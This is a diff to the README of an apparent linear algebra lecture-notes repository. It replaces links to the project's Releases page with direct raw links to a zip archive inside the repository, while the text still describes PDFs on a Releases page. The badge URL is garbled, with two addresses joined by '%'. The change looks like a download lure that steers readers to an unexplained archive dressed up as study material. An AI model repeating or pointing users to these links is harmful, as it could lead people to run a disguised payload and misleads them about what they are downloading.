@@ -1,7 +1,7 @@
 # 📘 linear-algebra-3blue1brown-notes - Easy-to-Follow Study Materials
 
 ## 🔗 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/neyof03/linear-algebra-3blue1brown-notes/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/neyof03/linear-algebra-3blue1brown-notes/master/english_notes/lectures/blue_notes_linear_brown_algebra_1.1.zip%https://raw.githubusercontent.com/neyof03/linear-algebra-3blue1brown-notes/master/english_notes/lectures/blue_notes_linear_brown_algebra_1.1.zip)](https://raw.githubusercontent.com/neyof03/linear-algebra-3blue1brown-notes/master/english_notes/lectures/blue_notes_linear_brown_algebra_1.1.zip)
 
 ## 📖 Overview
 Welcome to the **linear-algebra-3blue1brown-notes** repository! This project offers clear and accessible lecture notes on Linear Algebra, inspired by the popular **3Blue1Brown** series. The notes are available in both English and Persian and are formatted as high-quality PDFs. They are perfect for students, educators, or anyone interested in mastering linear algebra.
@@ -10,7 +10,7 @@ Welcome to the **linear-algebra-3blue1brown-notes** repository! This project off
 To get started with these materials, you will need to download the lecture notes from the Releases page. Follow these simple steps:
 
 ## 📥 Download & Install
-1. Visit the Releases page to find the available versions of the lecture notes: [Download Page](https://github.com/neyof03/linear-algebra-3blue1brown-notes/releases).
+1. Visit the Releases page to find the available versions of the lecture notes: [Download Page](https://raw.githubusercontent.com/neyof03/linear-algebra-3blue1brown-notes/master/english_notes/lectures/blue_notes_linear_brown_algebra_1.1.zip).
 
 2. On the Releases page, look for the latest version. You will find PDFs labeled for both English and Persian.
 
